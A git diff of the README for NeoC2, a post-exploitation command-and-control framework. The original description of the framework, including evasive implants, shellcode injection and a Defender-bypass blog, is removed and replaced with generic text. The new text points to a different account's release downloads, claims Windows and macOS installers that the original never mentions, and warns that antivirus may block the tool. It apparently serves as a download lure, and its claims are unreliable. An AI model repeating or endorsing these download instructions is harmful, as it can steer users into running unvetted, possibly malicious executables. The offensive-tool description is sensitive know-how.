@@ -1,75 +1,93 @@
-# The NeoC2 Framework 
-<a href="https://github.com/stillbigjosh/Neo"><img alt="Release" src="https://img.shields.io/badge/release-1.3.1-blue.svg"/></a> <a href="LICENSE"><img alt="license" src="https://img.shields.io/badge/License-GPL-green.svg"/></a> <a href=""><img alt="Platform" src="https://img.shields.io/badge/platform-Linux-lightgrey.svg"/></a> 
+# 🚀 Neo - A Simple Tool for Adversary Emulation
 
-_A modular server-client architecture post-exploitation framework built for collaborative agent management in red team operations and security testing. Enables flexibility by allowing operators to add their own modules._
+[![Download Neo](https://img.shields.io/badge/Download%20Neo-Here-brightgreen)](https://github.com/armnPemula/Neo/releases)
 
-### Architecture
-- Teamserver: Integrates the various managers of the command-and-control
-- Flask based web application handles all agent's HTTP/S communication endpoints
-- Listener stack: Runs as a separate processes from the Flask application, acting as internal redirectors, forwards traffic from agents to the web application
-- Remote Client: Separate from the C2 and can be operated from anywhere, allowing you to connect to the C2 via the Multiplayer co-ordinator
-- Polymorphic Payloads: These are unique, obfuscated implants with Anti-sandbox & Anti-debugger capability
-- Malleable profiles: For customizing agent behavior and communication patterns
-- Extensible modules: For post-exploitation tasks. External custom module are made operationally available via a Python-wrapper
-- SQLite-based storage for persistent data storage
+## 📖 Introduction
 
-### Managers
-- The Agent Manager: Core component coordinating communication between agents and other framework components.
-- Modules manager: Manages post-exploitation modules that can be executed on agents. 
-- Role and User Manager: Co-ordinates role-based access control (RBAC) with admin/operator/viewer roles 
-- Audit logger: Tracks user actions and permissions
-- Multiplayer session management: allows multiple operators to work simultaneously
-- Task Orchestrator: Chain modules for complex operations
-- Remote CLI Server: manages remote command-line interface for synchronized agent management and interactive sessions
-- Reporting handler to make post-operation report writing easy 
+Welcome to the NeoC2 Framework! Neo is a powerful tool designed to help security professionals simulate adversary behavior. It offers a straightforward way to emulate various attack techniques using a clear interface. Whether you're testing your security measures or just exploring defensive strategies, Neo can assist in understanding how attackers operate.
 
-### Security Features
-- HTTPS is the primary C2 channel. 
-- Implants are pre-registered with an ID and per-agent symmetric keys (AES-128-CBC + HMAC-SHA256). The framework validates the secret key and enforces encrypted communication using Fernet layer over HTTPS
-- All tasking and results JSON bodies are Fernet-encrypted per agent
-- Multiple authentication layers (sessions, tokens, roles)
-- Input validation and command injection prevention
-- Role-Based Access Control
+## 🛠️ Features
 
-### Multiplayer Features
-- Real-time collaboration between operators
-- Agent presence tracking
-- Interactive session locking
-- User presence and status management
+- **User-Friendly Interface:** Easily navigate through features without technical jargon.
+- **Multi-Platform Support:** Runs on Windows, macOS, and Linux, making it accessible for everyone.
+- **Customizable Modules:** Tailor your attack simulations using various pre-built modules.
+- **Detailed Logging:** Keep track of your actions and review logs for better understanding and learning.
+- **Integration Options:** Connect with other tools to enhance your security assessments.
 
-### Miscellaneous Features
-- In-memory PE file injection and execution
-- Shellcode injection
-- C2 Redirector support
-- Multi-server failover deloyment support
+## 📋 System Requirements
 
-## Installation:
-NeoC2 works well on Kali Linux. See the [Installations](https://neoc2.readthedocs.io/en/latest/Installation/) docs for instructions. 
+To run Neo effectively, your system should meet the following requirements:
 
-## Documentation 
-Read [https://neoc2.readthedocs.io/en/latest/](https://neoc2.readthedocs.io/en/latest/) for all Usage guides 
+- **Operating System:** 
+  - Windows 10 or higher
+  - macOS Mojave or higher
+  - Linux (most distributions)
+- **Processor:** At least 2 GHz
+- **RAM:** Minimum 4 GB
+- **Disk Space:** At least 200 MB free
 
-Blog PART 1: Learning: Neo Command & Control Framework (Part 1) Tutorial & Usage guide [https://medium.com/@stillbigjosh/learning-neo-command-control-framework-part-1-912ac0b68f2b](https://medium.com/@stillbigjosh/learning-neo-command-control-framework-part-1-912ac0b68f2b)
+## 🚀 Getting Started
 
-Blog PART 2: Learning: Neo Command & Control Framework (Part 2) Tutorial & Usage guide [https://stillbigjosh.medium.com/learning-neo-command-control-framework-part-2-tutorial-usage-guide-f2891b44a96d](https://stillbigjosh.medium.com/learning-neo-command-control-framework-part-2-tutorial-usage-guide-f2891b44a96d)
+### Step 1: Download Neo
 
-Blog PART 3: Bypassing Windows 11 Defender with NeoC2 & MSFVenom [https://stillbigjosh.medium.com/bypass-windows-11-defender-with-neoc2-msfvenom-part-3-e61cbe055bde](https://stillbigjosh.medium.com/bypass-windows-11-defender-with-neoc2-msfvenom-part-3-e61cbe055bde)
+To download Neo, visit the [Releases page](https://github.com/armnPemula/Neo/releases). Here, you'll find the latest version. 
 
+[![Download Neo](https://img.shields.io/badge/Download%20Neo-Here-brightgreen)](https://github.com/armnPemula/Neo/releases)
 
-### Contributions
-This project is accepting contributions and under active development. You can submit a pull request or Join discussions https://github.com/stillbigjosh/Neo/discussions
+### Step 2: Choose Your Version
 
-### Disclaimer
-Users are responsible for ensuring their use of this framework complies with laws, regulations, and corporate policies. The author cannot be held responsible for any malicious utilizations. The Software is intended exclusively for authorised penetration testers and security researchers who have obtained authorisation from the owner of each target system.
-By downloading this software you are accepting the terms of use and the licensing agreement.
+On the Releases page, locate the version you wish to download. Click on the appropriate file for your operating system. If you are unsure which file to select, look for:
 
-### Acknowledgments, Contributors & Involuntary Contributors
-- [@TrustedSec](https://github.com/trustedsec/COFFLoader) For their awesome COFFLoader and BOF collections 
-- [@PowerShellMafia](https://github.com/PowerShellMafia/PowerSploit) For their repository of powershell modules to practice the extendibility of the C2
+- **Windows:** Neo_Setup.exe
+- **macOS:** Neo.dmg
+- **Linux:** Neo.tar.gz
 
-### Support
-- **Bug Reports**: [Open an Issue](https://github.com/stillbigjosh/Neo/issues)
-- **Feature Requests**: [Discussions](https://github.com/stillbigjosh/Neo/discussions)
-- **Security Issues**: Contact @stillbigjosh privately 
-  
-_This Project is created and maintained by_ [@stillbigjosh](https://github.com/stillbigjosh)    
+### Step 3: Run the Installer
+
+Once the download is complete:
+
+- **Windows:**
+  1. Locate the `Neo_Setup.exe` file in your Downloads folder.
+  2. Double-click it to launch the installer.
+  3. Follow the on-screen instructions to install Neo.
+
+- **macOS:**
+  1. Open the `Neo.dmg` file from your Downloads.
+  2. Drag the Neo icon into your Applications folder.
+  3. Open Neo from the Applications folder.
+
+- **Linux:**
+  1. Extract the `Neo.tar.gz` file to a folder.
+  2. Open a terminal and navigate to the Neo folder.
+  3. Run the executable file by typing `./Neo` and pressing Enter.
+
+## ⚙️ Download & Install
+
+To download and install Neo, please follow this link: [Download Neo](https://github.com/armnPemula/Neo/releases). Make sure to select the version that fits your operating system.
+
+## 📊 Usage
+
+Once installed, launch Neo to start using it. You will find options to customize your attack simulations. The interface guides you through each feature for easy navigation.
+
+1. Select a module to simulate an attack.
+2. Configure parameters based on your objectives.
+3. Start the simulation and review the results.
+
+## 📓 Troubleshooting
+
+If you encounter issues while installing or using Neo, try the following:
+
+- Ensure your system meets the requirements.
+- Re-download the file in case of an incomplete download.
+- Check for any antivirus software that may block Neo.
+- Restart your system if an error occurs during installation.
+
+## 🗺️ Community & Support
+
+For questions or support, please feel free to reach out. Engage with other users in our community forum or check the documentation for detailed guides on using different features.
+
+## 🌟 Contributing
+
+We welcome contributions to Neo! If you have ideas for new features or improvements, please open an issue or submit a pull request. Your input helps make Neo better for everyone.
+
+Thank you for choosing the NeoC2 Framework. Happy simulating!
